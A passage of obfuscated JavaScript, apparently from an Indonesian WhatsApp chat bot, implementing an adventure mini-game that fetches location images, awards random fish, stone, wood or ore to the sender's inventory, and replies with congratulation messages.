-0x42a,_0x4eb2a3-0x37,_0xad90a3);}const _0x16bb5c={'VLtEf':function(_0x3a1e7a,_0x48a8cf){return _0x3a1e7a*_0x48a8cf;},'cyLdo':function(_0x152af0,_0x20a36d,_0x1f906f){return _0x152af0(_0x20a36d,_0x1f906f);},'NHBYS':function(_0x516ab0,_0x2fb3df){return _0x516ab0(_0x2fb3df);}},_0x16815c=Math[_0x301b7f(0xf1,0xc3,0xac,0x6f)](_0x16bb5c[_0x301b7f(0x50,-0x7,0x31,-0x2f)](Math[_0x4e029f(0x391,0x3d2,0x367,0x47b)](),0x19f6+-0x12af+-0x1*0x73d));_0x16bb5c[_0x4e029f(0x328,0x291,0x2d3,0x339)](addIkan,sender,_0x16815c),_0x16bb5c[_0x301b7f(0x10,0x9e,0x56,-0xc)](reply,_0x4e029f(0x33a,0x3bc,0x412,0x3e4)+_0x4e029f(0x39a,0x417,0x46b,0x444)+'\x20kamu\x20mend'+_0x301b7f(-0x79,-0xe4,-0x6a,-0x7e)+_0x16815c+(_0x4e029f(0x363,0x404,0x38a,0x32e)+_0x4e029f(0x345,0x301,0x39d,0x270)+'t'));},0x3d*-0x4f+-0x1*0x120d+0x2*0x184c),setTimeout(()=>{const _0x5233db={'LyyCg':function(_0x360254,_0x2692c9){return _0x360254(_0x2692c9);},'wLxmI':_0x93027a(0x129,0x3f,0x13,0xea)+_0x21e3e7(0x501,0x5d6,0x531,0x578)+_0x21e3e7(0x51f,0x59b,0x48f,0x55e)+'ggu...'};function _0x21e3e7(_0x12516f,_0x419b61,_0x2ba6a7,_0x11cf0f){return _0x2b5443(_0x12516f-0x2f,_0x12516f-0x3f,_0x2ba6a7-0x139,_0x419b61);}function _0x93027a(_0xc92222,_0x199bb5,_0x4d3b0c,_0x54655d){return _0x5c83b7(_0xc92222-0xa7,_0x199bb5-0x110,_0x54655d- -0x1ca,_0x199bb5);}_0x5233db[_0x93027a(0x234,0x2ef,0x2fe,0x25b)](reply,_0x5233db['wLxmI']);},0x5a9+-0xaf*-0x17+-0x1562);break;case _0x5c83b7(0x34d,0x3ce,0x3b1,0x3c6):case _0x5c83b7(0x23f,0x2f4,0x2f4,0x36e):if(!isEventon)return reply('Event\x20grub'+_0x5c83b7(0x243,0x362,0x308,0x284)+_0x5c83b7(0x368,0x2f1,0x37f,0x385));var tempsa=args[_0x2b5443(0x4a0,0x458,0x3d5,0x45a)]('\x20');if(tempsa==_0x5c83b7(0x41f,0x3a5,0x43f,0x4a7)+'iver'){const _0x23ac54={};_0x23ac54[_0x5c83b7(0x275,0x2d0,0x322,0x3ad)]=_0x2b5443(0x52f,0x4ca,0x4e4,0x4b4),asu=await getBuffer('https://te'+_0x2b5443(0x4c7,0x51e,0x5d3,0x4d0)+_0x5c83b7(0x24b,0x304,0x2b5,0x287)+'ab77a6cea8'+'1523e.jpg',_0x23ac54),setTimeout(()=>{const _0x46ebc0={'ajWxe':function(_0x1af47a,_0xb0a2a0){return _0x1af47a*_0xb0a2a0;},'Meltw':function(_0x4738f8,_0x407e5c){return _0x4738f8*_0x407e5c;},'iOyHv':function(_0x66a04,_0x1e1e31,_0x258562){return _0x66a04(_0x1e1e31,_0x258562);},'PaZQw':function(_0x3d1f8d,_0x57c636,_0x393e25,_0x272810,_0x40bfc6,_0x1c142f,_0x3b8be8){return _0x3d1f8d(_0x57c636,_0x393e25,_0x272810,_0x40bfc6,_0x1c142f,_0x3b8be8);},'CNlds':_0x17f8a2(0x245,0x22a,0x25c,0x27c)},_0x5b77e7=Math[_0x4b7d6b(-0x1ca,-0x13e,-0x24f,-0x194)](_0x46ebc0[_0x4b7d6b(-0x159,-0xb4,-0x8c,-0x147)](Math[_0x17f8a2(0x1f9,0x321,0x213,0x2a4)](),0xa7d+0x1c6c+-0xce1*0x3)),_0xf342cf=Math[_0x4b7d6b(-0x211,-0x1a6,-0x12b,-0x194)](_0x46ebc0[_0x4b7d6b(-0x190,-0x103,-0xcd,-0x19d)](Math['random'](),0x971+0x2*-0xe1f+0x1*0x12dc));_0x46ebc0[_0x4b7d6b(-0x248,-0x220,-0x263,-0x1b4)](addStone,sender,_0x5b77e7),_0x46ebc0['iOyHv'](addIkan,sender,_0xf342cf);function _0x4b7d6b(_0x12eefb,_0x53c1d2,_0x3e6715,_0x2a1600){return _0x2b5443(_0x12eefb-0x60,_0x2a1600- -0x66a,_0x3e6715-0x59,_0x12eefb);}const _0x3752ea={};_0x3752ea[_0x17f8a2(0x2c8,0x2b5,0x202,0x285)+'t']=_0x17f8a2(0x240,0x342,0x357,0x2ac)+_0x17f8a2(0xf2,0x235,0x1b5,0x1cd);function _0x17f8a2(_0x8ce00c,_0x134516,_0x2556dc,_0x4b5127){return _0x5c83b7(_0x8ce00c-0x1f4,_0x134516-0x175,_0x4b5127- -0x143,_0x2556dc);}const _0x25f2f3={};_0x25f2f3[_0x4b7d6b(-0x28a,-0x259,-0x2b9,-0x241)]=mek,_0x46ebc0[_0x4b7d6b(-0x28e,-0x33e,-0x2ef,-0x2c5)](sendButImage,from,_0x17f8a2(0x2e3,0x26e,0x327,0x28e)+_0x4b7d6b(-0x21e,-0x295,-0x192,-0x1dd)+enter+enter+(_0x4b7d6b(-0x235,-0x29e,-0x232,-0x21a)+'patkan\x20*')+_0x5b77e7+(_0x4b7d6b(-0x288,-0x271,-0x1bf,-0x229)+'\x20*')+_0xf342cf+_0x17f8a2(0x2d6,0x2de,0x21f,0x2cc)+enter+enter+(_0x4b7d6b(-0x11b,-0x214,-0x27b,-0x1ad)+_0x17f8a2(0x1d0,0xc7,0xc9,0x185)+_0x17f8a2(0x26a,0x387,0x2ff,0x2ed)+_0x17f8a2(0x235,0x25f,0x38f,0x2bb))+prefix+_0x17f8a2(0x207,0x135,0x17f,0x1e9),botname+'™©\x20|\x20By\x20'+ownername,asu,[{'buttonId':_0x4b7d6b(-0x1f8,-0x2da,-0x204,-0x281),'buttonText':_0x3752ea,'type':_0x46ebc0['CNlds']}],_0x25f2f3);},0x7ab*0x3+0x3d*0xb+-0xde8),setTimeout(()=>{const _0x1a1108={'cbqcY':function(_0x5ef7dd,_0x1923e7){return _0x5ef7dd(_0x1923e7);},'yNuey':_0x519059(0x189,0x14f,0x211,0x228)+_0x2b76b(0x2fa,0x3f0,0x38f,0x3a6)+'\x20silahkan\x20'+'tunggu...'};function _0x519059(_0x3c97d0,_0x168fcb,_0x3d8ad0,_0x3b64fd){return _0x2b5443(_0x3c97d0-0x44,_0x3b64fd- -0x262,_0x3d8ad0-0x7,_0x3d8ad0);}function _0x2b76b(_0x6396b1,_0x1ca723,_0x2c8d56,_0x35ba04){return _0x5c83b7(_0x6396b1-0xdc,_0x1ca723-0x9b,_0x2c8d56-0xd2,_0x35ba04);}_0x1a1108[_0x2b76b(0x3fa,0x406,0x412,0x4a3)](reply,_0x1a1108[_0x519059(0x13f,0x2b3,0x1c7,0x217)]);},0x493+0x1e23+0x5c9*-0x6);}else{if(tempsa===_0x5c83b7(0x26c,0x34c,0x347,0x3f4)+'oods'){const _0x235586={};_0x235586[_0x5c83b7(0x2b3,0x26d,0x322,0x2ae)]=_0x5c83b7(0x492,0x42a,0x3c4,0x414),gos=await getBuffer('https://te'+_0x5c83b7(0x3ae,0x39a,0x418,0x4a2)+_0x5c83b7(0x34f,0x37d,0x2d4,0x292)+_0x5c83b7(0x2a6,0x2cc,0x353,0x2fd)+_0x2b5443(0x555,0x4f4,0x4dc,0x5a1),_0x235586),setTimeout(()=>{const _0x56cf40={'YaMaU':function(_0x509cd3,_0xe65fab){return _0x509cd3*_0xe65fab;},'RmtmL':function(_0x579225,_0x53d64a){return _0x579225*_0x53d64a;},'svHzd':function(_0x25e8c7,_0x5b9987,_0x1b681d){return _0x25e8c7(_0x5b9987,_0x1b681d);},'nnWna':function(_0x31a2c6,_0x123c5b,_0x58633b,_0x6fbfd6,_0x5223fd,_0x18b46d,_0x21ad1e){return _0x31a2c6(_0x123c5b,_0x58633b,_0x6fbfd6,_0x5223fd,_0x18b46d,_0x21ad1e);},'FGwoA':_0x4451dd(0x26,-0x86,-0x73,-0x53)+_0x4451dd(-0x157,-0x134,-0x152,-0xb6),'jwzMz':'RESPONSE'},_0x59bad7=Math[_0x298c11(0xd4,0xdc,0x7f,0xe6)](_0x56cf40[_0x4451dd(0x79,-0x5f,-0x5c,0x1f)](Math['random'](),-0xb9f+-0x16c7+0x22d4)),_0x26d9cf=Math[_0x298c11(0x54,-0x1,0x7f,0xb)](_0x56cf40[_0x298c11(-0x128,-0xe6,-0x76,0x57)](Math['random'](),-0x6*0x6e+-0x1e3c+0x20e4));function _0x4451dd(_0x5773a3,_0x3e4c12,_0x5ad3f6,_0x2d4346){return _0x5c83b7(_0x5773a3-0x26,_0x3e4c12-0xa6,_0x5ad3f6- -0x462,_0x3e4c12);}_0x56cf40[_0x298c11(0x1a4,0x18c,0xf8,0x8f)](addStone,sender,_0x59bad7);function _0x298c11(_0x2f60fb,_0x151aa3,_0x456a71,_0x450c21){return _0x2b5443(_0x2f60fb-0xae,_0x456a71- -0x457,_0x456a71-0x33,_0x2f60fb);}_0x56cf40[_0x4451dd(0x83,-0x81,-0x19,-0x22)](addKayu,sender,_0x26d9cf);const _0x2ab31f={};_0x2ab31f[_0x298c11(-0xff,-0x8a,-0x2e,-0xc7)]=mek,_0x56cf40[_0x4451dd(-0xf6,-0x1e6,-0x169,-0xcc)](sendButImage,from,'*Congratul'+_0x4451dd(-0x2a,-0x18a,-0xdb,-0x15)+enter+enter+(_0x298c11(-0xa3,-0x8a,-0x7,-0x2c)+_0x298c11(0x36,0x60,0x23,-0x52))+_0x59bad7+(_0x298c11(0x96,-0x3e,-0x16,0x62)+'\x20*')+_0x26d9cf+'*\x20kayu'+enter+enter+(_0x4451dd(-0xb8,0x21,-0xab,-0xbf)+_0x4451dd(-0x209,-0x255,-0x19a,-0x249)+_0x4451dd(0x5b,0x77,-0x32,0x85)+_0x298c11(0x129,0xa4,0xad,0x171))+prefix+_0x4451dd(-0x1a1,-0x83,-0x136,-0x5f),botname+_0x4451dd(-0x115,-0xd9,-0x8b,0x3a)+ownername,gos,[{'buttonId':'inv','buttonText':{'displayText':_0x56cf40[_0x4451dd(-0x21,-0x178,-0xb0,-0x17b)]},'type':_0x56cf40[_0x4451dd(-0xab,0x55,-0x54,-0xdc)]}],_0x2ab31f);},-0xcb*0x2e+0x1132+-0x1f00*-0x1),setTimeout(()=>{function _0x5f041a(_0x4068f2,_0x35713a,_0x287f77,_0x5c6d8e){return _0x5c83b7(_0x4068f2-0x1f2,_0x35713a-0xcb,_0x4068f2-0x1a1,_0x35713a);}const _0x2441b0={'YWESS':function(_0x43337c,_0x4b09bc){return _0x43337c(_0x4b09bc);},'byTVx':_0x4aaa98(-0x49,-0x105,-0x11e,-0x197)+_0x5f041a(0x45e,0x4d4,0x448,0x506)+_0x4aaa98(0x8,-0x72,-0xa9,-0x1a)+_0x4aaa98(-0x53,-0x1ee,-0x118,-0x1e4)};function _0x4aaa98(_0x2e2ba4,_0x170488,_0x271822,_0x5e255f){return _0x5c83b7(_0x2e2ba4-0x49,_0x170488-0x2e,_0x271822- -0x4a2,_0x5e255f);}_0x2441b0['YWESS'](reply,_0x2441b0[_0x4aaa98(-0x190,-0x134,-0x184,-0x204)]);},-0x1c5d+-0x1*-0xde7+0xe76);}else{if(tempsa==='cochher\x20se'+'a'){const _0x5eb14a={};_0x5eb14a[_0x5c83b7(0x39e,0x2fd,0x322,0x314)]=_0x2b5443(0x401,0x4ca,0x401,0x516),seae=await getBuffer('https://te'+_0x2b5443(0x594,0x51e,0x481,0x4c9)+'ile/eabfc9'+_0x2b5443(0x494,0x3ec,0x459,0x391)+'6b0c0.jpg',_0x5eb14a),setTimeout(()=>{const _0x59cafb={'GuOLg':function(_0x337102,_0x41e240){return _0x337102*_0x41e240;},'ZbKka':function(_0x76bac5,_0x55e3f2,_0x3a7ffc){return _0x76bac5(_0x55e3f2,_0x3a7ffc);},'MAWzO':function(_0x52436d,_0x3994af,_0x28d2b5,_0x1949ca,_0x129b22,_0x10a7de,_0x4f6c76){return _0x52436d(_0x3994af,_0x28d2b5,_0x1949ca,_0x129b22,_0x10a7de,_0x4f6c76);},'MstDJ':_0x5df334(0x232,0x384,0x2f0,0x2be)+_0x5df334(0x264,0x1a5,0x211,0x1a2),'IuYEE':'RESPONSE'};function _0x5df334(_0xdf6398,_0x28b0a9,_0x3dea84,_0x5a6748){return _0x2b5443(_0xdf6398-0x1f0,_0x3dea84- -0x205,_0x3dea84-0x1d6,_0xdf6398);}function _0x9b8b29(_0x1633f1,_0x25eeb9,_0x36ecea,_0x65aa97){return _0x5c83b7(_0x1633f1-0x119,_0x25eeb9-0x111,_0x25eeb9- -0x546,_0x1633f1);}const _0x525004=Math[_0x5df334(0x37c,0x234,0x2d1,0x383)](_0x59cafb[_0x9b8b29(-0x232,-0x238,-0x1c7,-0x238)](Math[_0x9b8b29(-0x210,-0x15f,-0x20d,-0xb4)](),-0x119*0x4+-0x1577+0x45a*0x6));_0x59cafb[_0x9b8b29(-0x2ca,-0x27c,-0x1ef,-0x26d)](addIkan,sender,_0x525004);const _0x14dafa={};_0x14dafa[_0x9b8b29(-0x22c,-0x223,-0x27e,-0x2bd)]=mek,_0x59cafb['MAWzO'](sendButImage,from,'*Congratul'+'ation\x20🎊*'+enter+enter+(_0x5df334(0x285,0x255,0x24b,0x1a3)+_0x9b8b29(-0x1a5,-0x1d2,-0x17b,-0x188))+_0x525004+_0x9b8b29(-0x1eb,-0x137,-0x168,-0x1c3)+enter+enter+(_0x5df334(0x2b3,0x2fb,0x2b8,0x30b)+_0x9b8b29(-0x228,-0x27e,-0x2c1,-0x235)+'engan\x20cara'+'\x20ketik\x20')+prefix+'inventory',botname+_0x5df334(0x364,0x21c,0x2d8,0x25e)+ownername,seae,[{'buttonId':'inv','buttonText':{'displayText':_0x59cafb['MstDJ']},'type':_0x59cafb[_0x5df334(0xfd,0x1a8,0x1d3,0x1dc)]}],_0x14dafa);},0xc*-0x2a+0x1472+-0x6c2),setTimeout(()=>{function _0x392603(_0x4c014f,_0x1d6104,_0x4d76c0,_0x213f9c){return _0x5c83b7(_0x4c014f-0x114,_0x1d6104-0x167,_0x213f9c- -0x546,_0x4d76c0);}const _0x20b975={'nXHRq':function(_0x3cb701,_0x413b4a){return _0x3cb701(_0x413b4a);}};function _0x5582b8(_0x4cf9c1,_0x43700a,_0x160a56,_0x3d4109){return _0x5c83b7(_0x4cf9c1-0x1e3,_0x43700a-0x5d,_0x4cf9c1- -0x37d,_0x3d4109);}_0x20b975['nXHRq'](reply,_0x392603(-0x263,-0x17e,-0x274,-0x1c2)+_0x392603(-0x2bc,-0x267,-0x29e,-0x289)+_0x392603(-0x1e0,-0xf9,-0xb0,-0x14d)+'tunggu...');},-0x2*0x3ab+-0x1e1a+0x2570);}else{if(tempsa===_0x2b5443(0x486,0x525,0x490,0x4cc)+_0x2b5443(0x512,0x53b,0x50f,0x4f8)+'s'){const _0x253f9e={};_0x253f9e['method']=_0x5c83b7(0x2fa,0x343,0x3c4,0x3e1),seoe=await getBuffer(_0x2b5443(0x32d,0x3e6,0x3e8,0x3aa)+_0x5c83b7(0x3ae,0x3ab,0x418,0x342)+'ile/19a10f'+_0x5c83b7(0x3cb,0x3a7,0x3de,0x33e)+'267e4.jpg',_0x253f9e),setTimeout(()=>{function _0x1a2796(_0x42c94f,_0x6f114,_0x251c36,_0x39cf4b){return _0x2b5443(_0x42c94f-0x39,_0x251c36- -0x3aa,_0x251c36-0xd6,_0x39cf4b);}const _0x15fdc6={'jIDpZ':function(_0x582f06,_0x16950f){return _0x582f06*_0x16950f;},'Ukkvr':function(_0x4a8f0a,_0x171af8){return _0x4a8f0a*_0x171af8;},'didcK':function(_0x53b4cc,_0x4b315b,_0x37e374){return _0x53b4cc(_0x4b315b,_0x37e374);},'CHhxO':function(_0x19648a,_0x5b6e3f,_0x278bca,_0x341adc,_0x432e93,_0x1ce2e2,_0x131624){return _0x19648a(_0x5b6e3f,_0x278bca,_0x341adc,_0x432e93,_0x1ce2e2,_0x131624);},'zrkXw':'RESPONSE'},_0x1e820f=Math['ceil'](_0x15fdc6[_0x1a2796(0xcc,0xc3,0x17e,0x144)](Math[_0x7ecba2(0x2b7,0x281,0x35b,0x369)](),0xeb7+-0xae6+-0x39f)),_0x22a015=Math[_0x1a2796(0xb4,0x68,0x12c,0x1cf)](_0x15fdc6['Ukkvr'](Math[_0x7ecba2(0x319,0x3ed,0x35b,0x39e)](),0x24b3*0x1+-0x2*-0x1365+-0x3*0x190f));_0x15fdc6[_0x1a2796(0x11d,0x164,0x168,0x205)](addOre,sender,_0x1e820f);function _0x7ecba2(_0x3ffcd5,_0x29ca58,_0x10e12f,_0x56f509){return _0x5c83b7(_0x3ffcd5-0x1d9,_0x29ca58-0x1c7,_0x10e12f- -0x8c,_0x3ffcd5);}_0x15fdc6['didcK'](addStone,sender,_0x22a015);const _0x5d3240={};_0x5d3240[_0x7ecba2(0x2cc,0x330,0x33c,0x3b1)+'t']='My\x20Invento'+_0x7ecba2(0x222,0x25d,0x284,0x21e);const _0x294d9f={};_0x294d9f['quoted']=mek,_0x15fdc6[_0x1a2796(0x112,0xa2,0xd7,0x68)](sendButImage,from,_0x1a2796(0x1db,0xf1,0x12d,0xc4)+_0x7ecba2(0x25c,0x2b9,0x2fb,0x356)+enter+enter+('Kamu\x20menda'+'patkan\x20*')+_0x1e820f+(_0x1a2796(-0xb2,0xfd,0x25,-0x64)+_0x7ecba2(0x3d2,0x3fc,0x3b4,0x46b))+_0x22a015+_0x7ecba2(0x2a1,0x33c,0x328,0x343)+enter+enter+(_0x1a2796(0xeb,0xeb,0x113,0x17d)+_0x1a2796(0xa,-0x15,0x24,-0x3b)+_0x1a2796(0xbe,0x198,0x18c,0xfc)+'\x20ketik\x20')+prefix+'inventory',botname+_0x7ecba2(0x281,0x3cd,0x34b,0x375)+ownername,seoe,[{'buttonId':_0x7ecba2(0x287,0x244,0x257,0x19f),'buttonText':_0x5d3240,'type':_0x15fdc6[_0x7ecba2(0x3c5,0x3a1,0x3a6,0x30f)]}],_0x294d9f);},-0x970+-0x1e36+0x335e),setTimeout(()=>{function _0x586cc6(_0x4ee6b8,_0x5a7338,_0x4ed871,_0xb3c0f4){return _0x5c83b7(_0x4ee6b8-0x1ea,_0x5a7338-0x1cd,_0x4ee6b8- -0x31,_0xb3c0f4);}function _0x5e042d(_0x271587,_0x33b007,_0x4e4129,_0x552566){return _0x2b5443(_0x271587-0x44,_0x33b007- -0x5fb,_0x4e4129-0x1df,_0x552566);}const _0x40c7f2={'VjiYT':function(_0x59f228,_0x3540f9){return _0x59f228(_0x3540f9);},'GFRuM':_0x5e042d(-0x18a,-0x171,-0x220,-0x10a)+_0x586cc6(0x28c,0x294,0x2b7,0x2b4)+_0x586cc6(0x3c8,0x42b,0x417,0x3a4)+_0x5e042d(-0x173,-0x16b,-0xe8,-0x13a)};_0x40c7f2[_0x5e042d(-0x274,-0x1dc,-0x1f0,-0x295)](reply,_0x40c7f2[_0x5e042d(-0x251,-0x1be,-0x26d,-0x24d)]);},0x205b+0x5*0x4f8+-0x3933);}else{if(tempsa===_0x2b5443(0x31d,0x3d3,0x3ef,0x3a1)+_0x2b5443(0x527,0x499,0x487,0x49c)){const _0x14b23a={};_0x14b23a[_0x5c83b7(0x35b,0x3b5,0x322,0x2d9)]=_0x2b5443(0x4fe,0x4ca,0x42b,0x56a),seye=await getBuffer(_0x5c83b7(0x348,0x28f,0x2e0,0x353)+_0x5c83b7(0x4d6,0x4bb,0x418,0x36e)+_0x5c83b7(0x2f4,0x2d8,0x2cf,0x399)+_0x5c83b7(0x37d,0x47f,0x3ad,0x3c4)+_0x5c83b7(0x23e,0x34e,0x304,0x2c5),_0x14b23a),setTimeout(()=>{const _0x440e38={'vnnku':function(_0x396a34,_0x25be70){return _0x396a34*_0x25be70;},'gqOcz':function(_0x4cfdf7,_0x25a618){return _0x4cfdf7*_0x25a618;},'RZYDE':function(_0x5e31b2,_0x1929c9,_0x57fbc0){return _0x5e31b2(_0x1929c9,_0x57fbc0);},'NEAho':function(_0x4c06a4,_0x6fdbc1,_0x386391){return _0x4c06a4(_0x6fdbc1,_0x386391);},'mDEeG':function(_0x223277,_0x25708a,_0x1c7236,_0x4dde01,_0x361fe1,_0x2f331f,_0xc6c16c){return _0x223277(_0x25708a,_0x1c7236,_0x4dde01,_0x361fe1,_0x2f331f,_0xc6c16c);},'qLXEq':_0x463cf0(0x581,0x5bf,0x560,0x544)+_0x2473d8(-0x18a,-0xee,-0x169,-0x174),'pNPZj':_0x463cf0(0x580,0x5a8,0x530,0x511)},_0x1b34cd=Math[_0x2473d8(0x59,-0x2e,0xac,-0x76)](_0x440e38[_0x463cf0(0x582,0x4e3,0x53c,0x5c8)](Math[_0x2473d8(0x82,-0x17,0x45,-0xb6)](),-0x9*-0x3aa+0x1*0x148+-0x6d2*0x5));function _0x2473d8(_0x334ce9,_0x2adbcf,_0x2f0c06,_0x39491d){return _0x2b5443(_0x334ce9-0x163,_0x2adbcf- -0x504,_0x2f0c06-0xc5,_0x39491d);}const _0x749740=Math['ceil'](_0x440e38['gqOcz'](Math['random'](),0x1bcd+0x1*0xdff+0x14c8*-0x2));_0x440e38[_0x463cf0(0x433,0x529,0x486,0x488)](addOre,sender,_0x1b34cd),_0x440e38['NEAho'](addStone,sender,_0x749740);function _0x463cf0(_0x500936,_0x52142a,_0x234b92,_0x45685c){return _0x2b5443(_0x500936-0x17d,_0x234b92-0x6b,_0x234b92-0x68,_0x500936);}const _0xcf40fd={};_0xcf40fd[_0x463cf0(0x555,0x4de,0x494,0x4e9)]=mek,_0x440e38[_0x463cf0(0x4fc,0x5c0,0x50e,0x5ce)](sendButImage,from,_0x2473d8(0x67,-0x2d,0x4e,0x47)+'ation\x20🎊*'+enter+enter+(_0x2473d8(-0x5f,-0xb4,-0x67,-0x94)+_0x463cf0(0x49b,0x562,0x4e5,0x483))+_0x1b34cd+(_0x2473d8(-0x1c8,-0x135,-0xd0,-0x1ab)+_0x463cf0(0x66c,0x66c,0x5b1,0x5a1))+_0x749740+_0x2473d8(0x2e,-0x4a,-0x4d,-0x53)+enter+enter+(_0x2473d8(0x36,-0x47,-0x105,-0x39)+_0x463cf0(0x3fb,0x434,0x439,0x452)+_0x463cf0(0x4e3,0x63e,0x5a1,0x501)+'\x20ketik\x20')+prefix+_0x2473d8(0x9,-0xd2,-0x6b,-0xd1),botname+_0x463cf0(0x5c9,0x5a3,0x548,0x553)+ownername,seye,[{'buttonId':_0x463cf0(0x509,0x45f,0x454,0x508),'buttonText':{'displayText':_0x440e38[_0x463cf0(0x47b,0x40b,0x478,0x503)]},'type':_0x440e38[_0x2473d8(-0xdd,-0xa5,-0x5e,0x22)]}],_0xcf40fd);},-0x1*0xe6b+-0x215c+0x3b7f),setTimeout(()=>{function _0x44fdbe(_0x131a9a,_0x20b2b4,_0x450b3c,_0x1404d3){return _0x2b5443(_0x131a9a-0x1a8,_0x450b3c- -0xf5,_0x450b3c-0x95,_0x1404d3);}function _0x10c033(_0x2aad7f,_0xad5e9c,_0x1b122a,_0x2308d2){return _0x2b5443(_0x2aad7f-0x13d,_0x2308d2- -0x4a8,_0x1b122a-0xa8,_0xad5e9c);}const _0x6ba221={'gjZYu':function(_0x324649,_0x4bf3c0){return _0x324649(_0x4bf3c0);},'tmmxF':_0x10c033(0x9c,-0x7e,0x85,-0x1e)+_0x10c033(-0x50,-0xc2,-0xf0,-0xe5)+_0x44fdbe(0x3b2,0x391,0x40a,0x447)+_0x10c033(0x3b,0x7b,-0x2d,-0x18)};_0x6ba221['gjZYu'](reply,_0x6ba221[_0x10c033(0x5d,-0x5,-0x2c,0x75)]);},-0x1*-0x62+0x1*-0x1502+0x14a0);}else{if(tempsa===_0x2b5443(0x37c,0x413,0x4c8,0x42f)+'ds'){const _0x1ed393={};_0x1ed393[_0x5c83b7(0x281,0x349,0x322,0x303)]=_0x2b5443(0x506,0x4ca,0x43d,0x492),siae=await getBuffer(_0x5c83b7(0x27d,0x27f,0x2e0,0x358)+_0x5c83b7(0x401,0x433,0x418,0x4a1)+_0x2b5443(0x5fc,0x542,0x5ec,0x549)+_0x5c83b7(0x373,0x3ce,0x3c0,0x31f)+_0x2b5443(0x3e8,0x42f,0x4ac,0x4ee),_0x1ed393),setTimeout(()=>{const _0x3261cb={'pdMjA':function(_0x311887,_0x58c6f7){return _0x311887*_0x58c6f7;},'bNPPS':function(_0x4f76a3,_0x2d6765){return _0x4f76a3*_0x2d6765;},'ZPjOU':function(_0x6492db,_0x59f17a,_0x1f314d){return _0x6492db(_0x59f17a,_0x1f314d);},'MFjUE':function(_0x4114c7,_0x317b62,_0x53ae97){return _0x4114c7(_0x317b62,_0x53ae97);},'BkwWe':function(_0x47ae50,_0x348dbb,_0x2f82b9,_0x2b40b1,_0xd71fe4,_0x57548a,_0x5baa6b){return _0x47ae50(_0x348dbb,_0x2f82b9,_0x2b40b1,_0xd71fe4,_0x57548a,_0x5baa6b);},'ZDNnI':'My\x20Invento'+_0x3ff993(0x28c,0x304,0x1c9,0x291),'XpogC':_0x39f812(0x616,0x5d3,0x5ea,0x643)},_0x372ce9=Math['ceil'](_0x3261cb[_0x39f812(0x620,0x61b,0x610,0x5b3)](Math[_0x3ff993(0x2d1,0x31c,0x41d,0x368)](),-0x59c*0x2+0x1a15*0x1+-0xe83)),_0x3bb3e5=Math[_0x39f812(0x577,0x5a3,0x5fb,0x5fb)](_0x3261cb[_0x3ff993(0x384,0x2a8,0x294,0x2c2)](Math[_0x3ff993(0x306,0x3ae,0x3af,0x368)](),0x3*-0xa65+-0x30b*0x1+0x2267));_0x3261cb['ZPjOU'](addStone,sender,_0x372ce9),_0x3261cb[_0x3ff993(0x45c,0x322,0x36b,0x388)](addKayu,sender,_0x3bb3e5);const _0x33c163={};function _0x39f812(_0x280876,_0x1cdbc,_0xdd01bc,_0x49d043){return _0x5c83b7(_0x280876-0xcc,_0x1cdbc-0x181,_0xdd01bc-0x22b,_0x280876);}_0x33c163[_0x3ff993(0x23c,0x323,0x28d,0x2a4)]=mek;function _0x3ff993(_0x5bdfdb,_0xdf4789,_0x493ed9,_0x4d5c20){return _0x5c83b7(_0x5bdfdb-0x19b,_0xdf4789-0x10e,_0x4d5c20- -0x7f,_0x493ed9);}_0x3261cb[_0x3ff993(0x29d,0x346,0x2de,0x279)](sendButImage,from,_0x39f812(0x650,0x6a6,0x5fc,0x58e)+'ation\x20🎊*'+enter+enter+(_0x3ff993(0x2a1,0x316,0x2ad,0x2cb)+_0x39f812(0x52a,0x55b,0x59f,0x678))+_0x372ce9+(_0x3ff993(0x209,0x2a7,0x350,0x2bc)+'\x20*')+_0x3bb3e5+_0x39f812(0x563,0x654,0x5e0,0x582)+enter+enter+(_0x39f812(0x655,0x523,0x5e2,0x5cf)+_0x3ff993(0x176,0x190,0x2d4,0x249)+_0x3ff993(0x3bb,0x2fe,0x481,0x3b1)+_0x3ff993(0x31e,0x313,0x3f1,0x37f))+prefix+'inventory',botname+_0x39f812(0x637,0x554,0x602,0x5ac)+ownername,siae,[{'buttonId':_0x39f812(0x5d5,0x474,0x50e,0x4ed),'buttonText':{'displayText':_0x3261cb['ZDNnI']},'type':_0x3261cb[_0x39f812(0x62f,0x61f,0x5ae,0x635)]}],_0x33c163);},0x3*-0x2f5+-0x22*0x2c+0x65*0x43),setTimeout(()=>{function _0x23e138(_0x41db43,_0x4faaab,_0x2eb209,_0x8ea67b){return _0x2b5443(_0x41db43-0x1d7,_0x8ea67b- -0x2dd,_0x2eb209-0x1cf,_0x2eb209);}function _0x39763f(_0x4c4171,_0x2b6c61,_0x189cf4,_0xbd6459){return _0x5c83b7(_0x4c4171-0x1b6,_0x2b6c61-0x17b,_0x2b6c61- -0x74,_0x4c4171);}reply(_0x39763f(0x2d3,0x310,0x37c,0x334)+'petualang,'+_0x23e138(0x29f,0x2c6,0x2d6,0x222)+_0x39763f(0x34a,0x316,0x398,0x2e7));},-0xdb*0x25+-0xee0+0x2e87);}else{if(tempsa===_0x2b5443(0x48a,0x45d,0x4ea,0x39b)+_0x2b5443(0x54c,0x51b,0x5e3,0x5d1)){const _0x2b1318={};_0x2b1318[_0x5c83b7(0x313,0x30e,0x322,0x363)]=_0x2b5443(0x537,0x4ca,0x4d0,0x453),bbbb=await getBuffer(_0x2b5443(0x37f,0x3e6,0x469,0x398)+_0x2b5443(0x5dc,0x51e,0x4df,0x5b9)+_0x5c83b7(0x4aa,0x326,0x3f2,0x34b)+_0x2b5443(0x48d,0x549,0x5c5,0x60b)+_0x2b5443(0x432,0x48c,0x4e1,0x3ef),_0x2b1318),setTimeout(()=>{const _0x1c54c4={'rBMmi':function(_0x2dbd53,_0x11d1f6){return _0x2dbd53*_0x11d1f6;},'vmCwx':function(_0xfb1be9,_0x18bd58,_0x53daea){return _0xfb1be9(_0x18bd58,_0x53daea);},'fXRaV':function(_0x345045,_0x5522cc,_0x3b858a,_0x567019,_0x338917,_0x5df171,_0xdd426c){return 